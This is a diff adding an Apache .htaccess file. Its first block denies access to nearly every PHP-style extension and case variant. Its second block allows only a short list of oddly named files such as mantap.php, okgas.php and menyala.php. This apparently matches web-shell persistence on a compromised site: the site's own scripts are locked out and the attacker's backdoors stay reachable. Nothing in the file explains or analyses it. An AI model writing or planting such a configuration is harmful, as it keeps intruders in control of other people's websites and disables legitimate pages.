@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(shtml|py|ini|awd|conf|exe|phtml|ht|htacces|gif|php.gif|php|phar|inc|pjpeg|php.|pht|phtm|fla|php.fla|php.FLA|PHP.FLA|php<?.jpg|php.sql|php.txt|txt.php|phps|PhaR|pHTM|xhtml|php%00|PHPs|pHAr|pHps|pHTml|phTMl|phtML|phTML|phpS||PHP|Php|PHp|pHp|pHP|PhP|phP|pHTML|Phtml|pHtMl|PhTmL|pHtml||PHtml|PHTml|PHTMl|phtmL|PHTML|phTml|PHAR|Phar|PHar|PHAr|pHAR|phAr|phaR|PHaR|phAR|Inc|INC|inC|INc|iNC|iNc|Shtml|sHTML|sHtMl|ShTmL|PHP.|PHAR.|jpg;php|php;jpg|php;.jpg|jpg;.php|php<?.html|php;png|php.XXXTXT|php1|php2|php3|php4|php5|php6|php7|php8|php9|php10|php56|php74|pHar|php.inc|php.jpg|php.pjpeg|PhtmL|phtML|phTML|shtmL|shtML|shTML|json|JSON|pHp5|pHp1|pHp2|pHp3|pHp4|pHp6|pHp7|pHp8|pHp9|pHp10|pHp56|pHp74|PHP1|PHP2|PHP3|PHP4|PHP5|PHP6|PHP7|PHP8|PHP9|PHP10|PHP56|PHP74|Php1|Php2|Php3|Php4|Php5|Php6|Php7|Php8|Php9|Php10|Php56|Php74|phP1|phP2|phP3|phP4|phP5|phP6|phP7|phP8|phP9|phP10|phP56|phP74|PHp1|PHp2|PHp3|PHp4|PHp5|PHp6|PHp7|PHp8|PHp9|PHp10|PHp56|PHp74|pHP1|pHP2|pHP3|pHP4|pHP5|pHP6|pHP7|pHP8|pHP9|pHP10|pHP11|pHP56|pHP74|PhP1|PhP2|PhP3|PhP4|PhP5|PhP6|PhP7|PhP8|PhP9|PhP10|PhP56|PhP74|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(11222.php|pp.php|445.php|mantap.php|bis.php|linux.shtml|waff2.php|a1.php|a2.php|okgas.php|menyala.php|ehey.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
